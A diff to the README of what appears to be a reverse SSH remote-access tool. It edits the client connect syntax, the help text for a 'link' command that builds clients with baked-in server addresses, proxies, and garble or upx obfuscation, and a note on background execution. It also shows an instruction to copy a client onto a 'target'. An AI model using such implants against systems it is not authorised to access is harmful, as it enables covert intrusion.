@@ -59,7 +59,7 @@ And more!
 - [Help](#help)
   - [Windows and SFTP](#windows-and-sftp)
   - [Server started with `--insecure` still has `Failed to handshake`](#server-started-with---insecure-still-has-failed-to-handshake)
-  - [Foreground vs Background (Important note about clients)](#foreground-vs-background-important-note-about-clients)
+  - [Foreground vs Background](#foreground-vs-background)
 - [Donations, Support, or Giving Back](#donations-support-or-giving-back)
 
 ## TL;DR
@@ -89,7 +89,7 @@ cp ~/.ssh/id_ed25519.pub authorized_keys
 
 ```sh
 # copy client to your target then connect it to the server
-./client -d our.rssh.server.com:3232
+./client -d your.rssh.server.com:3232
 
 # Get help text
 ssh your.rssh.server.com -p 3232 help
@@ -197,7 +197,7 @@ $ RSSH_HOMESERVER=your.rssh.server.com:3232 make
 $ bin/client
 
 # Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
-$ bin/client example.com:3232
+$ bin/client -d example.com:3232
 ```
 
 ### Built in Web Server
@@ -215,17 +215,19 @@ catcher$ link -h
 link [OPTIONS]
 Link will compile a client and serve the resulting binary on a link which is returned.
 This requires the web server component has been enabled.
-	-t	Set number of minutes link exists for (default is one time use)
 	-s	Set homeserver address, defaults to server --external_address if set, or server listen address if not.
 	-l	List currently active download links
 	-r	Remove download link
-	--goos	Set the target build operating system (default to runtime GOOS)
-	--goarch	Set the target build architecture (default to runtime GOARCH)
-	--name	Set link name
+	-C	Comment to add as the public key (acts as the name)
+	--goos	Set the target build operating system (default runtime GOOS)
+	--goarch	Set the target build architecture (default runtime GOARCH)
+	--name	Set the link download url/filename (default random characters)
+	--proxy	Set connect proxy address to bake it
 	--shared-object	Generate shared object file
-  --fingerprint Set RSSH server fingerprint will default to server public key
-  --upx   Use upx to compress the final binary (requires upx to be installed)
-  --garble	Use garble to obfuscate the binary (requires garble to be installed)
+	--fingerprint	Set RSSH server fingerprint will default to server public key
+	--garble	Use garble to obfuscate the binary (requires garble to be installed)
+	--upx	Use upx to compress the final binary (requires upx to be installed)
+	--no-lib-c	Compile client without glibc
 
 # Build a client binary
 catcher$ link --name test
@@ -385,11 +387,9 @@ Note the `/` before the starting character.
 If the client binary was generated with the `link` command this client has the server public key fingerprint baked in by default. If you lose your server private key, the clients will no longer be able to connect.  
 You can also generate clients with `link --fingerprint <fingerprint here>` to specify a fingerprint, there isnt currently a way to disable this as per version 1.0.13.  
 
-## Foreground vs Background (Important note about clients)
+## Foreground vs Background
 
-By default, clients will run in the background. When started they will execute a new background instance (thus forking a new child process) and then the parent process will exit. If the fork is successful the message "Ending parent" will be printed.
-
-This has one important ramification: once in the background a client will not show any output, including connection failure messages. If you need to debug your client, use the `--foreground` flag.
+By default, clients will run in the background then the parent process will exit, the child process will be given the parent processes stdout/stderr so you will be able to see output. If you need to debug your client, use the `--foreground` flag.
 
 # Donations, Support, or Giving Back
   
